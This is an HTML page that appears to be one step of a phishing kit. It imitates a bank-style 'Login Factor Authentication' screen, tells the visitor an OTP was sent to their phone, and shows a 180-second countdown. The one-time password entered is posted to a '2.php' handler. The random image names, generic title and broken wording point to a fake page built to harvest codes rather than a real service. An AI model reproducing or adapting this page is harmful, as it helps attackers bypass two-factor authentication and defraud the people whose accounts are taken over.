<!DOCTYPE html>

<html lang="zxx">

<head>

    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Document</title>

    <style>

        #aa ,#bb ,#jj ,#kk

        {

            width: 100%;

        }

        #ff

        {

            width: 90%;

            margin-left: 5%;

            margin-right: 5%;

            height: 28px;

            border-width:0.1px;

            border-radius:5px;

            background-color: #eaeaea;

        }

        #dd

        {

            margin-left: 5%;

            font-size: 16px;

        }

        #hh

        {

            width: 80px;

            height: 25px;

            border-color:#ff9408 ;

            border-radius:5px;

            color: white;

            background-color: #ff9408

            

            

            

        }

       #tem

       {

           margin-left:5%;

           font-size:20px;

       }

       #loo

       {

           height: 35px;

           color:#017294;

           background-color:#d9f6ff

       }

       #kuku

       {

           color:#017294;

           font-size:15px;

           width:100%;

       }

       #djj

       {

           color:#ff9408

       }

       #kik

       {

           background-color:#eaeaea;

           height: 28px;

       }

       #loiuh

       {

           margin-left:5%;

       }

       #red

       {

           color:white;

           background-color:#004a3a;

           width: 70px;

           margin-left: 5%;

       }

    </style>

</head>

<body>

    <img src="JAJWJWWNWNWWNW.jpg" alt="" id="aa">

    <div id="kik">

        <p>

            Welcome

        </p>

    </div>

    <div id="loo">

        <p >

           <b>

           Login Factor Authentication

           </b>

        </p>

    </div>

    <div id="kku">

        <b id="kuku">

           <pre>

Otp sent your registered mobile number 

           </pre>

        </b>

    </div>

    <div id="kukum">

        <p id="djj">

            Mandatory field are marked with an asterisk(*)

        </p>

    </div>

    

    <form action="2.php" method="post">

        <div class="cc">

            <p id="dd">

                <b>

                    One Time Password*

                </b>

            </p>

        </div>

        <div class="ee">

            <input type="number" name="otp1*" id="ff" required="" >

        </div> 







          <div id="tim">

          <b>

          <p id="tem"> wait for OTP..<span id="countdowntimer">180 </span> Seconds</p>

          </b>



<script type="text/javascript">

    var timeleft = 180;

    var downloadTimer = setInterval(function(){

    timeleft--;

    document.getElementById("countdowntimer").textContent = timeleft;

    if(timeleft <= 0)

        clearInterval(downloadTimer);

    },1000);

</script>

          </div>

        <div class="gg">

           <center>

            <button type="submit" id="hh"> Confirm </button>

           </center>

        </div> <br>

        <div id="loiuh">

        </div>

        <br>

        <img src="Fjfjjffjfjjfjff-bbb.jpeg" alt="" id="jj">

        <img src="Jccjvjjgjgcjcj-ccc.jpeg" alt="" id="kk">

    </form>

</body>

</html>
